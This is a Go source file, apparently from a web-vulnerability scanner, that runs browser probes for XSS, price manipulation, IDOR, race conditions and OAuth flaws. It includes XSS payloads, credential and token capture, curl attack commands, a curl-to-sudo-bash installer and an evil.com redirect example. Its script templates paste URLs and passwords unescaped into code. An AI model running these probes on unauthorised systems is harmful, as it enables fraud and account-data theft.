// Package sandbox - Browser automation for CyberMind XSS verification + authenticated scanning
// Priority: Local Playwright -> Vercel Sandbox -> curl fallback
package sandbox

import (
	"bytes"
	"crypto/tls"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"os"
	"os/exec"
	"strings"
	"time"
)

// SandboxResult holds the result of a sandbox operation
type SandboxResult struct {
	Success    bool
	Output     string
	Screenshot string
	Cookies    map[string]string
	Error      string
	Duration   time.Duration
	Method     string // "playwright" | "vercel" | "curl"
}

// LoginResult holds captured session after authenticated login
type LoginResult struct {
	Success bool
	Cookies map[string]string
	Headers map[string]string
	Token   string
	Error   string
	Method  string
}

var sandboxClient = &http.Client{
	Timeout: 60 * time.Second,
	Transport: &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	},
}

func getVercelToken() string { return os.Getenv("VERCEL_TOKEN") }

// IsAvailable returns true if any browser automation is available
func IsAvailable() bool { return hasPlaywright() || getVercelToken() != "" }

func hasPlaywright() bool {
	if _, err := exec.LookPath("node"); err != nil {
		return false
	}
	cmd := exec.Command("node", "-e", "require('playwright')")
	cmd.Stdin = nil
	return cmd.Run() == nil
}

// VerifyXSSInBrowser verifies XSS in a real browser with auto-fallback:
// 1. Local Playwright (fastest, most reliable)
// 2. Vercel Sandbox (cloud browser)
// 3. curl reflection check (basic fallback)
func VerifyXSSInBrowser(targetURL, payload string) SandboxResult {
	start := time.Now()
	if hasPlaywright() {
		r := verifyXSSPlaywright(targetURL, payload)
		r.Duration = time.Since(start)
		r.Method = "playwright"
		return r
	}
	if getVercelToken() != "" {
		r := verifyXSSVercel(targetURL)
		r.Duration = time.Since(start)
		r.Method = "vercel"
		return r
	}
	r := verifyXSSCurl(targetURL, payload)
	r.Duration = time.Since(start)
	r.Method = "curl"
	return r
}

func verifyXSSPlaywright(targetURL, payload string) SandboxResult {
	script := `const{chromium}=require('playwright');(async()=>{const b=await chromium.launch({args:['--no-sandbox']});const p=await b.newPage();let x=false;p.on('dialog',async d=>{x=true;await d.dismiss();});try{await p.goto('` + targetURL + `',{waitUntil:'networkidle',timeout:15000});await p.waitForTimeout(2000);console.log(JSON.stringify({xss_triggered:x,url:p.url()}));}catch(e){console.log(JSON.stringify({error:e.message}));}await b.close();})();`
	tmpFile := "/tmp/cybermind_xss_verify.js"
	os.WriteFile(tmpFile, []byte(script), 0644)
	defer os.Remove(tmpFile)
	cmd := exec.Command("node", tmpFile)
	cmd.Stdin = nil
	out, err := runWithTimeout(cmd, 30)
	if err != nil {
		return SandboxResult{Error: err.Error()}
	}
	var parsed struct {
		XSSTriggered bool   `json:"xss_triggered"`
		Error        string `json:"error"`
	}
	json.Unmarshal([]byte(out), &parsed)
	return SandboxResult{Success: parsed.XSSTriggered, Output: out, Error: parsed.Error}
}

func verifyXSSVercel(targetURL string) SandboxResult {
	script := `const{chromium}=require('playwright');(async()=>{const b=await chromium.launch();const p=await b.newPage();let x=false;p.on('dialog',async d=>{x=true;await d.dismiss();});try{await p.goto('` + targetURL + `',{waitUntil:'networkidle',timeout:15000});await p.waitForTimeout(2000);console.log(JSON.stringify({xss_triggered:x}));}catch(e){console.log(JSON.stringify({error:e.message}));}await b.close();})();`
	return runSandboxScript(script)
}

func verifyXSSCurl(targetURL, payload string) SandboxResult {
	client := &http.Client{Timeout: 10 * time.Second, Transport: &http.Transport{TLSClientConfig: &tls.Config{InsecureSkipVerify: true}}}
	resp, err := client.Get(targetURL)
	if err != nil {
		return SandboxResult{Error: err.Error()}
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(io.LimitReader(resp.Body, 512*1024))
	reflected := strings.Contains(string(body), payload) || strings.Contains(string(body), "<script>")
	return SandboxResult{
		Success: reflected,
		Output:  fmt.Sprintf("curl reflection check: reflected=%v (JS execution not verified)", reflected),
	}
}

// LoginAndCapture performs login and captures session — auto-fallback
func LoginAndCapture(loginURL, username, password string) LoginResult {
	if hasPlaywright() {
		r := loginPlaywright(loginURL, username, password)
		r.Method = "playwright"
		return r
	}
	if getVercelToken() != "" {
		r := loginVercel(loginURL, username, password)
		r.Method = "vercel"
		return r
	}
	return LoginResult{Error: "no browser available — install: sudo npm install -g playwright && sudo playwright install chromium"}
}

func loginPlaywright(loginURL, username, password string) LoginResult {
	script := `const{chromium}=require('playwright');(async()=>{const b=await chromium.launch({args:['--no-sandbox']});const ctx=await b.newContext();const p=await ctx.newPage();const toks=[];p.on('request',r=>{const h=r.headers();if(h['authorization'])toks.push(h['authorization']);});try{await p.goto('` + loginURL + `',{waitUntil:'networkidle',timeout:15000});const es=['input[type="email"]','input[name="email"]','input[name="username"]','#email','#username'];const ps=['input[type="password"]','input[name="password"]','#password'];const ss=['button[type="submit"]','input[type="submit"]'];let f=false;for(const s of es){try{await p.fill(s,'` + username + `',{timeout:2000});f=true;break;}catch{}}for(const s of ps){try{await p.fill(s,'` + password + `',{timeout:2000});break;}catch{}}if(f){for(const s of ss){try{await p.click(s,{timeout:2000});break;}catch{}}}await p.waitForTimeout(3000);const cs=await ctx.cookies();const cm={};cs.forEach(c=>{cm[c.name]=c.value;});const ls=await p.evaluate(()=>{const d={};for(let i=0;i<localStorage.length;i++){const k=localStorage.key(i);d[k]=localStorage.getItem(k);}return d;});console.log(JSON.stringify({success:p.url()!=='` + loginURL + `',cookies:cm,tokens:toks,local_storage:ls,final_url:p.url()}));}catch(e){console.log(JSON.stringify({error:e.message,success:false}));}await b.close();})();`
	tmpFile := "/tmp/cybermind_login.js"
	os.WriteFile(tmpFile, []byte(script), 0644)
	defer os.Remove(tmpFile)
	cmd := exec.Command("node", tmpFile)
	cmd.Stdin = nil
	out, err := runWithTimeout(cmd, 30)
	if err != nil {
		return LoginResult{Error: err.Error()}
	}
	var parsed struct {
		Success      bool              `json:"success"`
		Cookies      map[string]string `json:"cookies"`
		Tokens       []string          `json:"tokens"`
		LocalStorage map[string]string `json:"local_storage"`
		Error        string            `json:"error"`
	}
	if err := json.Unmarshal([]byte(out), &parsed); err != nil {
		return LoginResult{Error: "parse error: " + err.Error()}
	}
	result := LoginResult{
		Success: parsed.Success,
		Cookies: parsed.Cookies,
		Headers: make(map[string]string),
		Error:   parsed.Error,
	}
	for _, t := range parsed.Tokens {
		if strings.HasPrefix(t, "Bearer ") {
			result.Token = strings.TrimPrefix(t, "Bearer ")
			result.Headers["Authorization"] = t
			break
		}
	}
	for k, v := range parsed.LocalStorage {
		lower := strings.ToLower(k)
		if strings.Contains(lower, "token") || strings.Contains(lower, "jwt") || strings.Contains(lower, "auth") {
			result.Token = v
			result.Headers["Authorization"] = "Bearer " + v
			break
		}
	}
	return result
}

func loginVercel(loginURL, username, password string) LoginResult {
	script := `const{chromium}=require('playwright');(async()=>{const b=await chromium.launch();const ctx=await b.newContext();const p=await ctx.newPage();try{await p.goto('` + loginURL + `',{waitUntil:'networkidle',timeout:15000});try{await p.fill('input[type="email"]','` + username + `',{timeout:2000});}catch{}try{await p.fill('input[type="password"]','` + password + `',{timeout:2000});}catch{}try{await p.click('button[type="submit"]',{timeout:2000});}catch{}await p.waitForTimeout(3000);const cs=await ctx.cookies();const cm={};cs.forEach(c=>{cm[c.name]=c.value;});console.log(JSON.stringify({success:true,cookies:cm}));}catch(e){console.log(JSON.stringify({error:e.message}));}await b.close();})();`
	result := runSandboxScript(script)
	var parsed struct {
		Success bool              `json:"success"`
		Cookies map[string]string `json:"cookies"`
		Error   string            `json:"error"`
	}
	if err := json.Unmarshal([]byte(result.Output), &parsed); err != nil {
		return LoginResult{Error: result.Error}
	}
	return LoginResult{
		Success: parsed.Success,
		Cookies: parsed.Cookies,
		Headers: make(map[string]string),
		Error:   parsed.Error,
	}
}

// TakeScreenshot captures a screenshot — tries Playwright then Vercel
func TakeScreenshot(targetURL string) (string, error) {
	if hasPlaywright() {
		outFile := "/tmp/cybermind_screenshot.png"
		script := `const{chromium}=require('playwright');(async()=>{const b=await chromium.launch({args:['--no-sandbox']});const p=await b.newPage();await p.setViewportSize({width:1280,height:720});try{await p.goto('` + targetURL + `',{waitUntil:'networkidle',timeout:15000});await p.screenshot({path:'` + outFile + `'});console.log(JSON.stringify({saved:'` + outFile + `'}));}catch(e){console.log(JSON.stringify({error:e.message}));}await b.close();})();`
		tmpFile := "/tmp/cybermind_ss.js"
		os.WriteFile(tmpFile, []byte(script), 0644)
		defer os.Remove(tmpFile)
		cmd := exec.Command("node", tmpFile)
		cmd.Stdin = nil
		if _, err := runWithTimeout(cmd, 20); err != nil {
			return "", err
		}
		return outFile, nil
	}
	if getVercelToken() != "" {
		script := `const{chromium}=require('playwright');(async()=>{const b=await chromium.launch();const p=await b.newPage();try{await p.goto('` + targetURL + `',{waitUntil:'networkidle',timeout:15000});const ss=await p.screenshot({encoding:'base64'});console.log(JSON.stringify({screenshot:ss}));}catch(e){console.log(JSON.stringify({error:e.message}));}await b.close();})();`
		result := runSandboxScript(script)
		var parsed struct {
			Screenshot string `json:"screenshot"`
		}
		json.Unmarshal([]byte(result.Output), &parsed)
		return parsed.Screenshot, nil
	}
	return "", fmt.Errorf("no browser available")
}

// InstallPlaywright installs Playwright + Chromium on Linux automatically
func InstallPlaywright() {
	cmds := [][]string{
		{"bash", "-c", "curl -fsSL https://deb.nodesource.com/setup_20.x | sudo -E bash - 2>/dev/null || true"},
		{"sudo", "apt-get", "install", "-y", "-qq", "nodejs"},
		{"sudo", "npm", "install", "-g", "playwright"},
		{"sudo", "npx", "playwright", "install", "chromium", "--with-deps"},
	}
	for _, args := range cmds {
		cmd := exec.Command(args[0], args[1:]...)
		cmd.Stdin = nil
		cmd.Stdout = os.Stdout
		cmd.Stderr = os.Stderr
		cmd.Run()
	}
}

func runSandboxScript(script string) SandboxResult {
	token := getVercelToken()
	if token == "" {
		return SandboxResult{Error: "VERCEL_TOKEN not set"}
	}
	payload := map[string]interface{}{
		"runtime":  "nodejs",
		"code":     script,
		"packages": []string{"playwright"},
		"timeout":  30,
	}
	body, _ := json.Marshal(payload)
	req, err := http.NewRequest("POST", "https://api.vercel.com/v1/sandbox/run", bytes.NewBuffer(body))
	if err != nil {
		return SandboxResult{Error: err.Error()}
	}
	req.Header.Set("Authorization", "Bearer "+token)
	req.Header.Set("Content-Type", "application/json")
	resp, err := sandboxClient.Do(req)
	if err != nil {
		return SandboxResult{Error: "vercel sandbox: " + err.Error()}
	}
	defer resp.Body.Close()
	raw, _ := io.ReadAll(io.LimitReader(resp.Body, 5*1024*1024))
	var result struct {
		Output string `json:"output"`
		Stdout string `json:"stdout"`
		Error  string `json:"error"`
	}
	json.Unmarshal(raw, &result)
	out := result.Output
	if out == "" {
		out = result.Stdout
	}
	return SandboxResult{Success: result.Error == "", Output: out, Error: result.Error}
}

func runWithTimeout(cmd *exec.Cmd, timeoutSec int) (string, error) {
	var out strings.Builder
	cmd.Stdout = &out
	cmd.Stderr = &out
	done := make(chan error, 1)
	go func() { done <- cmd.Run() }()
	select {
	case err := <-done:
		return strings.TrimSpace(out.String()), err
	case <-time.After(time.Duration(timeoutSec) * time.Second):
		if cmd.Process != nil {
			cmd.Process.Kill()
		}
		return out.String(), fmt.Errorf("timeout after %ds", timeoutSec)
	}
}

func min(a, b int) int {
	if a < b {
		return a
	}
	return b
}

// ─── Autonomous Browser Testing Engine ───────────────────────────────────────
//
// When the agent can't automate something with CLI tools, it uses Playwright
// to open a real browser and test manually-hard scenarios:
// - Business logic (price manipulation via UI)
// - OAuth flows (real browser redirect chains)
// - Race conditions (concurrent browser tabs)
// - IDOR via authenticated sessions
// - DOM-based XSS that curl misses
//
// If browser test succeeds → report the bug
// If browser test fails → generate exact manual steps for the user

// BrowserTestResult holds the result of an autonomous browser test
type BrowserTestResult struct {
	TestName    string
	Success     bool
	BugFound    bool
	Evidence    string
	Screenshot  string // path to screenshot file
	ManualSteps string // if BugFound=false, exact steps for user
	Error       string
	Duration    time.Duration
}

// RunAutonomousBrowserTests runs all browser-based tests that CLI tools can't do.
// Returns findings + manual steps for anything it couldn't confirm.
func RunAutonomousBrowserTests(targetURL string, cookies map[string]string, progress func(string)) []BrowserTestResult {
	var results []BrowserTestResult

	if !hasPlaywright() {
		progress("Installing Playwright for browser testing...")
		InstallPlaywright()
		if !hasPlaywright() {
			return []BrowserTestResult{{
				TestName:    "playwright_setup",
				ManualSteps: generateManualStepsNoPlaywright(targetURL),
			}}
		}
	}

	progress("Browser engine ready — running autonomous tests...")

	// Test 1: Business Logic — Price Manipulation
	progress("Testing: price manipulation via browser...")
	r := testPriceManipulationBrowser(targetURL, cookies)
	results = append(results, r)

	// Test 2: IDOR via authenticated session
	progress("Testing: IDOR enumeration...")
	r2 := testIDORBrowser(targetURL, cookies)
	results = append(results, r2)

	// Test 3: Race condition on forms
	progress("Testing: race conditions...")
	r3 := testRaceConditionBrowser(targetURL, cookies)
	results = append(results, r3)

	// Test 4: DOM-based XSS
	progress("Testing: DOM XSS...")
	r4 := testDOMXSSBrowser(targetURL, cookies)
	results = append(results, r4)

	// Test 5: OAuth state parameter
	progress("Testing: OAuth flow...")
	r5 := testOAuthBrowser(targetURL)
	results = append(results, r5)

	return results
}

func testPriceManipulationBrowser(targetURL string, cookies map[string]string) BrowserTestResult {
	start := time.Now()
	cookieStr := buildCookieString(cookies)

	script := `
const { chromium } = require('playwright');
(async () => {
  const browser = await chromium.launch({ args: ['--no-sandbox'] });
  const context = await browser.newContext();
  const page = await context.newPage();
  
  // Set cookies if provided
  const cookieStr = '` + cookieStr + `';
  if (cookieStr) {
    const cookieList = cookieStr.split(';').map(c => {
      const [name, value] = c.trim().split('=');
      return { name: name.trim(), value: (value || '').trim(), url: '` + targetURL + `' };
    }).filter(c => c.name);
    if (cookieList.length > 0) await context.addCookies(cookieList);
  }
  
  const results = { found: false, evidence: '', screenshot: '' };
  
  // Intercept all requests to find price/amount parameters
  const priceRequests = [];
  page.on('request', req => {
    const body = req.postData() || '';
    const url = req.url();
    if (/price|amount|cost|total|fee|charge/i.test(body + url)) {
      priceRequests.push({ url, method: req.method(), body });
    }
  });
  
  try {
    await page.goto('` + targetURL + `', { waitUntil: 'networkidle', timeout: 15000 });
    
    // Look for price inputs, cart buttons, checkout forms
    const priceInputs = await page.$$('input[name*="price"], input[name*="amount"], input[name*="cost"], [data-price], .price');
    
    if (priceInputs.length > 0) {
      // Try to manipulate price
      for (const input of priceInputs.slice(0, 3)) {
        try {
          await input.fill('-1');
          results.evidence += 'Found price input, set to -1. ';
        } catch {}
      }
      
      // Submit any forms
      const submitBtn = await page.$('button[type="submit"], input[type="submit"], .checkout-btn, #checkout');
      if (submitBtn) {
        await submitBtn.click();
        await page.waitForTimeout(2000);
        const responseText = await page.content();
        if (/success|confirmed|order|thank/i.test(responseText)) {
          results.found = true;
          results.evidence += 'Form submitted with negative price — success response detected!';
        }
      }
    }
    
    // Check intercepted requests for price params
    if (priceRequests.length > 0) {
      results.evidence += ' Price params found in: ' + priceRequests.map(r => r.url).slice(0, 3).join(', ');
    }
    
    const ssPath = '/tmp/cybermind_price_test.png';
    await page.screenshot({ path: ssPath });
    results.screenshot = ssPath;
    
  } catch(e) {
    results.evidence = 'Error: ' + e.message;
  }
  
  console.log(JSON.stringify(results));
  await browser.close();
})();
`

	out, err := runPlaywrightScript(script, 45)
	result := BrowserTestResult{
		TestName: "price_manipulation",
		Duration: time.Since(start),
	}

	if err != nil {
		result.Error = err.Error()
		result.ManualSteps = generateManualStepsPriceManipulation(targetURL)
		return result
	}

	var parsed struct {
		Found      bool   `json:"found"`
		Evidence   string `json:"evidence"`
		Screenshot string `json:"screenshot"`
	}
	if json.Unmarshal([]byte(out), &parsed) == nil {
		result.BugFound = parsed.Found
		result.Evidence = parsed.Evidence
		result.Screenshot = parsed.Screenshot
		result.Success = true
	}

	if !result.BugFound {
		result.ManualSteps = generateManualStepsPriceManipulation(targetURL)
	}
	return result
}

func testIDORBrowser(targetURL string, cookies map[string]string) BrowserTestResult {
	start := time.Now()
	cookieStr := buildCookieString(cookies)

	script := `
const { chromium } = require('playwright');
(async () => {
  const browser = await chromium.launch({ args: ['--no-sandbox'] });
  const context = await browser.newContext();
  const page = await context.newPage();
  
  const cookieStr = '` + cookieStr + `';
  if (cookieStr) {
    const cookieList = cookieStr.split(';').map(c => {
      const [name, value] = c.trim().split('=');
      return { name: name.trim(), value: (value || '').trim(), url: '` + targetURL + `' };
    }).filter(c => c.name);
    if (cookieList.length > 0) await context.addCookies(cookieList);
  }
  
  const results = { found: false, evidence: '', idorURLs: [] };
  
  // Collect all URLs with numeric IDs
  const idURLs = new Set();
  page.on('response', async resp => {
    const url = resp.url();
    if (/\/\d+|id=\d+|user_id=\d+/i.test(url)) {
      idURLs.add(url);
    }
  });
  
  try {
    await page.goto('` + targetURL + `', { waitUntil: 'networkidle', timeout: 15000 });
    await page.waitForTimeout(2000);
    
    // Try to find and click profile/account links
    for (const sel of ['a[href*="profile"]', 'a[href*="account"]', 'a[href*="user"]', '.profile-link']) {
      try { await page.click(sel, { timeout: 2000 }); break; } catch {}
    }
    await page.waitForTimeout(1000);
    
    const currentURL = page.url();
    const idMatch = currentURL.match(/\/(\d+)|[?&](?:id|user_id|account_id)=(\d+)/);
    
    if (idMatch) {
      const currentID = parseInt(idMatch[1] || idMatch[2]);
      const testID = currentID + 1;
      const testURL = currentURL.replace(String(currentID), String(testID));
      
      await page.goto(testURL, { timeout: 10000 });
      await page.waitForTimeout(1000);
      
      const content = await page.content();
      const hasUserData = /email|username|phone|address|password/i.test(content);
      const notError = !/403|forbidden|unauthorized|not found/i.test(content);
      
      if (hasUserData && notError) {
        results.found = true;
        results.evidence = 'IDOR: Accessed user ' + testID + ' data at ' + testURL;
      } else {
        results.evidence = 'Tested ID ' + testID + ' at ' + testURL + ' — no IDOR detected';
      }
      results.idorURLs = [currentURL, testURL];
    } else {
      results.evidence = 'No numeric IDs found in URLs. IDs found: ' + Array.from(idURLs).slice(0, 5).join(', ');
    }
  } catch(e) {
    results.evidence = 'Error: ' + e.message;
  }
  
  console.log(JSON.stringify(results));
  await browser.close();
})();
`

	out, err := runPlaywrightScript(script, 45)
	result := BrowserTestResult{
		TestName: "idor_browser",
		Duration: time.Since(start),
	}

	if err != nil {
		result.Error = err.Error()
		result.ManualSteps = generateManualStepsIDOR(targetURL)
		return result
	}

	var parsed struct {
		Found    bool     `json:"found"`
		Evidence string   `json:"evidence"`
		IDORURLs []string `json:"idorURLs"`
	}
	if json.Unmarshal([]byte(out), &parsed) == nil {
		result.BugFound = parsed.Found
		result.Evidence = parsed.Evidence
		result.Success = true
	}

	if !result.BugFound {
		result.ManualSteps = generateManualStepsIDOR(targetURL)
	}
	return result
}

func testRaceConditionBrowser(targetURL string, cookies map[string]string) BrowserTestResult {
	start := time.Now()
	cookieStr := buildCookieString(cookies)

	// Race condition: open 10 tabs simultaneously and submit the same form
	script := `
const { chromium } = require('playwright');
(async () => {
  const browser = await chromium.launch({ args: ['--no-sandbox'] });
  const results = { found: false, evidence: '', successCount: 0 };
  
  try {
    // Find a form to race on
    const context = await browser.newContext();
    const page = await context.newPage();
    
    const cookieStr = '` + cookieStr + `';
    if (cookieStr) {
      const cookieList = cookieStr.split(';').map(c => {
        const [name, value] = c.trim().split('=');
        return { name: name.trim(), value: (value || '').trim(), url: '` + targetURL + `' };
      }).filter(c => c.name);
      if (cookieList.length > 0) await context.addCookies(cookieList);
    }
    
    await page.goto('` + targetURL + `', { waitUntil: 'networkidle', timeout: 15000 });
    
    // Look for coupon/promo/redeem forms
    const formSelectors = [
      'form[action*="coupon"]', 'form[action*="promo"]', 'form[action*="redeem"]',
      'input[name*="coupon"]', 'input[name*="promo"]', 'input[name*="code"]'
    ];
    
    let raceTarget = null;
    for (const sel of formSelectors) {
      const el = await page.$(sel);
      if (el) { raceTarget = sel; break; }
    }
    
    if (raceTarget) {
      // Send 10 concurrent requests
      const promises = [];
      for (let i = 0; i < 10; i++) {
        promises.push((async () => {
          const ctx2 = await browser.newContext();
          const p2 = await ctx2.newPage();
          try {
            await p2.goto('` + targetURL + `', { timeout: 10000 });
            const input = await p2.$(raceTarget);
            if (input) {
              await input.fill('RACE_TEST_CODE');
              const submit = await p2.$('button[type="submit"]');
              if (submit) {
                await submit.click();
                await p2.waitForTimeout(1000);
                const content = await p2.content();
                return /success|applied|valid/i.test(content);
              }
            }
          } catch {}
          await ctx2.close();
          return false;
        })());
      }
      
      const raceResults = await Promise.all(promises);
      const successCount = raceResults.filter(Boolean).length;
      results.successCount = successCount;
      
      if (successCount > 1) {
        results.found = true;
        results.evidence = 'Race condition: ' + successCount + '/10 concurrent requests succeeded (expected: 1)';
      } else {
        results.evidence = 'Race condition test: ' + successCount + '/10 succeeded — no race condition detected';
      }
    } else {
      results.evidence = 'No coupon/promo forms found for race condition testing';
    }
  } catch(e) {
    results.evidence = 'Error: ' + e.message;
  }
  
  console.log(JSON.stringify(results));
  await browser.close();
})();
`

	out, err := runPlaywrightScript(script, 60)
	result := BrowserTestResult{
		TestName: "race_condition",
		Duration: time.Since(start),
	}

	if err != nil {
		result.Error = err.Error()
		result.ManualSteps = generateManualStepsRace(targetURL)
		return result
	}

	var parsed struct {
		Found        bool   `json:"found"`
		Evidence     string `json:"evidence"`
		SuccessCount int    `json:"successCount"`
	}
	if json.Unmarshal([]byte(out), &parsed) == nil {
		result.BugFound = parsed.Found
		result.Evidence = parsed.Evidence
		result.Success = true
	}

	if !result.BugFound {
		result.ManualSteps = generateManualStepsRace(targetURL)
	}
	return result
}

func testDOMXSSBrowser(targetURL string, cookies map[string]string) BrowserTestResult {
	start := time.Now()

	script := `
const { chromium } = require('playwright');
(async () => {
  const browser = await chromium.launch({ args: ['--no-sandbox'] });
  const page = await browser.newPage();
  const results = { found: false, evidence: '', payload: '' };
  
  let xssTriggered = false;
  let xssPayload = '';
  
  page.on('dialog', async dialog => {
    xssTriggered = true;
    xssPayload = dialog.message();
    await dialog.dismiss();
  });
  
  // DOM XSS payloads
  const payloads = [
    '#<img src=x onerror=alert(1)>',
    '?q=<script>alert(1)</script>',
    '?search=<img src=x onerror=alert(document.domain)>',
    '#javascript:alert(1)',
    '?redirect=javascript:alert(1)',
  ];
  
  try {
    for (const payload of payloads) {
      await page.goto('` + targetURL + `' + payload, { waitUntil: 'networkidle', timeout: 10000 });
      await page.waitForTimeout(1500);
      
      if (xssTriggered) {
        results.found = true;
        results.evidence = 'DOM XSS triggered with payload: ' + payload;
        results.payload = payload;
        break;
      }
    }
    
    if (!results.found) {
      results.evidence = 'No DOM XSS found with ' + payloads.length + ' payloads';
    }
  } catch(e) {
    results.evidence = 'Error: ' + e.message;
  }
  
  console.log(JSON.stringify(results));
  await browser.close();
})();
`

	out, err := runPlaywrightScript(script, 60)
	result := BrowserTestResult{
		TestName: "dom_xss",
		Duration: time.Since(start),
	}

	if err != nil {
		result.Error = err.Error()
		return result
	}

	var parsed struct {
		Found    bool   `json:"found"`
		Evidence string `json:"evidence"`
		Payload  string `json:"payload"`
	}
	if json.Unmarshal([]byte(out), &parsed) == nil {
		result.BugFound = parsed.Found
		result.Evidence = parsed.Evidence
		result.Success = true
	}
	return result
}

func testOAuthBrowser(targetURL string) BrowserTestResult {
	start := time.Now()

	script := `
const { chromium } = require('playwright');
(async () => {
  const browser = await chromium.launch({ args: ['--no-sandbox'] });
  const page = await browser.newPage();
  const results = { found: false, evidence: '', oauthURLs: [] };
  
  try {
    await page.goto('` + targetURL + `', { waitUntil: 'networkidle', timeout: 15000 });
    
    // Find OAuth/SSO login buttons
    const oauthSelectors = [
      'a[href*="oauth"]', 'a[href*="auth"]', 'a[href*="login"]',
      'button:has-text("Google")', 'button:has-text("GitHub")', 'button:has-text("Facebook")',
      'a:has-text("Sign in with")', 'a:has-text("Login with")'
    ];
    
    for (const sel of oauthSelectors) {
      try {
        const el = await page.$(sel);
        if (el) {
          const href = await el.getAttribute('href') || '';
          if (href.includes('oauth') || href.includes('auth') || href.includes('redirect')) {
            results.oauthURLs.push(href);
            
            // Check for missing state parameter
            if (!href.includes('state=')) {
              results.found = true;
              results.evidence = 'OAuth URL missing state parameter (CSRF risk): ' + href;
            }
            
            // Check for open redirect in redirect_uri
            if (href.includes('redirect_uri=') && !href.includes(encodeURIComponent('` + targetURL + `'))) {
              results.evidence += ' Potentially open redirect_uri: ' + href;
            }
          }
        }
      } catch {}
    }
    
    if (results.oauthURLs.length === 0) {
      results.evidence = 'No OAuth flows detected on this page';
    } else if (!results.found) {
      results.evidence = 'OAuth URLs found but no obvious issues: ' + results.oauthURLs.slice(0, 3).join(', ');
    }
  } catch(e) {
    results.evidence = 'Error: ' + e.message;
  }
  
  console.log(JSON.stringify(results));
  await browser.close();
})();
`

	out, err := runPlaywrightScript(script, 30)
	result := BrowserTestResult{
		TestName: "oauth_flow",
		Duration: time.Since(start),
	}

	if err != nil {
		result.Error = err.Error()
		result.ManualSteps = generateManualStepsOAuth(targetURL)
		return result
	}

	var parsed struct {
		Found     bool     `json:"found"`
		Evidence  string   `json:"evidence"`
		OAuthURLs []string `json:"oauthURLs"`
	}
	if json.Unmarshal([]byte(out), &parsed) == nil {
		result.BugFound = parsed.Found
		result.Evidence = parsed.Evidence
		result.Success = true
	}

	if !result.BugFound {
		result.ManualSteps = generateManualStepsOAuth(targetURL)
	}
	return result
}

// ─── Manual Steps Generators ──────────────────────────────────────────────────
// When browser test fails, generate exact steps for the user

func generateManualStepsPriceManipulation(targetURL string) string {
	return fmt.Sprintf(`## Manual Test: Price Manipulation on %s

**Why:** Automated browser couldn't find price inputs. Test manually with Burp Suite.

**Steps:**
1. Open Burp Suite → turn on Intercept
2. Go to %s and add any item to cart
3. Proceed to checkout
4. In Burp, find the POST request with price/amount parameter
5. Change the value to: -1, 0, 0.001, or 99999999
6. Forward the request

**What to look for:**
- Response says "Order confirmed" with negative/zero price → CRITICAL bug
- Price in response matches your manipulated value → CRITICAL bug
- Error message reveals internal price calculation → INFO

**Curl test (if you find the endpoint):**
`+"```bash"+`
curl -X POST %s/api/cart/checkout \
  -H "Content-Type: application/json" \
  -H "Cookie: YOUR_SESSION_COOKIE" \
  -d '{"items": [{"id": 1, "quantity": 1, "price": -1}]}'
`+"```", targetURL, targetURL, targetURL)
}

func generateManualStepsIDOR(targetURL string) string {
	return fmt.Sprintf(`## Manual Test: IDOR on %s

**Why:** No numeric IDs found automatically. Test manually.

**Steps:**
1. Log in to %s
2. Go to your profile/account page
3. Note the URL — look for numbers: /users/1234, ?id=1234, /account/1234
4. Change the number to 1235, 1233, 1, 2, 100
5. Check if you see another user's data

**Also test these endpoints:**
- %s/api/users/YOUR_ID → change to YOUR_ID+1
- %s/api/orders/ORDER_ID → change to ORDER_ID+1
- %s/api/profile?user_id=YOUR_ID → change user_id

**What to look for:**
- Another user's email, name, phone → HIGH severity IDOR
- Another user's orders/payments → CRITICAL severity IDOR
- 200 response with different data → confirmed IDOR

**Burp Intruder setup:**
1. Send the request to Intruder
2. Mark the ID parameter
3. Use Numbers payload: 1 to 1000, step 1
4. Look for responses with different content length`, targetURL, targetURL, targetURL, targetURL, targetURL)
}

func generateManualStepsRace(targetURL string) string {
	return fmt.Sprintf(`## Manual Test: Race Condition on %s

**Why:** No coupon/promo forms found automatically. Test manually.

**Steps:**
1. Find any single-use action: coupon code, referral bonus, limited offer
2. Open terminal and run these 20 concurrent requests:

`+"```bash"+`
# Replace URL and cookie with real values
for i in $(seq 1 20); do
  curl -s -X POST %s/api/coupon/apply \
    -H "Content-Type: application/json" \
    -H "Cookie: YOUR_SESSION" \
    -d '{"code": "PROMO10"}' &
done
wait
`+"```"+`

3. Check if coupon was applied more than once

**Burp Turbo Intruder (most reliable):**
1. Send coupon request to Turbo Intruder
2. Use this script:
`+"```python"+`
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                          concurrentConnections=20,
                          requestsPerConnection=1,
                          pipeline=False)
    for i in range(20):
        engine.queue(target.req)

def handleResponse(req, interesting):
    if 'success' in req.response.lower():
        table.add(req)
`+"```"+`

**What to look for:**
- Multiple "success" responses → race condition confirmed
- Balance/points applied multiple times → CRITICAL`, targetURL, targetURL)
}

func generateManualStepsOAuth(targetURL string) string {
	return fmt.Sprintf(`## Manual Test: OAuth/SSO on %s

**Steps:**
1. Click "Login with Google/GitHub/Facebook" on %s
2. Copy the full OAuth URL from browser address bar
3. Check for these issues:

**Test 1 — Missing state parameter (CSRF):**
- If URL has no &state= parameter → CSRF vulnerability
- Report: "OAuth flow missing CSRF protection"

**Test 2 — Open redirect_uri:**
`+"```"+`
# Original: redirect_uri=https://target.com/callback
# Test: redirect_uri=https://evil.com
# If OAuth provider accepts it → token theft possible
`+"```"+`

**Test 3 — Token in URL (leakage):**
- After OAuth completes, check if access_token appears in URL
- If yes → token leakage via Referer header

**Test 4 — State parameter reuse:**
1. Start OAuth flow, copy the state value
2. Cancel and start again
3. Use the old state value
4. If it works → state not invalidated → CSRF possible

**Burp steps:**
1. Intercept the OAuth callback request
2. Modify the code parameter to an old/used code
3. If it works → authorization code reuse vulnerability`, targetURL, targetURL)
}

func generateManualStepsNoPlaywright(targetURL string) string {
	return fmt.Sprintf(`## Manual Testing Required — %s

Playwright not available. Install it first:
`+"```bash"+`
sudo apt install nodejs npm -y
sudo npm install -g playwright
sudo playwright install chromium --with-deps
`+"```"+`

Then re-run: sudo cybermind /plan %s

Or test manually with Burp Suite following the guides above.`, targetURL, targetURL)
}

// ─── Helpers ──────────────────────────────────────────────────────────────────

func runPlaywrightScript(script string, timeoutSec int) (string, error) {
	tmpFile := fmt.Sprintf("/tmp/cybermind_pw_%d.js", time.Now().UnixNano())
	if err := os.WriteFile(tmpFile, []byte(script), 0644); err != nil {
		return "", err
	}
	defer os.Remove(tmpFile)

